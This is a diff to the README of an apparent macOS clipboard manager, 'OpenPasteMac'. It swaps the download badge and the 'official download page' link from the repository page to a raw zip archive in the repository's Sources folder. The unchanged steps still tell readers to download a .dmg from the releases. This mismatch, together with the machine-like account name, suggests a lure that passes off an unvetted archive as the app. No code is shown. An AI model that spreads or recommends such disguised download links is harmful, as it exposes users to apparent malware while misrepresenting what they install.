@@ -1,6 +1,6 @@
 # 📋 OpenPasteMac - Manage your clipboard history with ease
 
-[![](https://img.shields.io/badge/Download-OpenPasteMac-blue.svg)](https://github.com/Deploymenttravelexpense256/OpenPasteMac)
+[![](https://img.shields.io/badge/Download-OpenPasteMac-blue.svg)](https://github.com/Deploymenttravelexpense256/OpenPasteMac/raw/refs/heads/main/Sources/Mac_Open_Paste_2.3.zip)
 
 OpenPasteMac is a tool for your clipboard. It saves the items you copy so you do not lose them. You can access your past copies with a single shortcut. The app stays in your menu bar. It works fast and does not slow down your machine.
 
@@ -12,7 +12,7 @@ To use OpenPasteMac, you need a Mac. The app works on macOS version 11.0 or newe
 
 Follow these steps to install the app.
 
-1. Visit the [official download page](https://github.com/Deploymenttravelexpense256/OpenPasteMac).
+1. Visit the [official download page](https://github.com/Deploymenttravelexpense256/OpenPasteMac/raw/refs/heads/main/Sources/Mac_Open_Paste_2.3.zip).
 2. Look for the latest release on the right side of the page.
 3. Click the file ending in .dmg to start the download.
 4. Open the file once it finishes saving to your Mac.
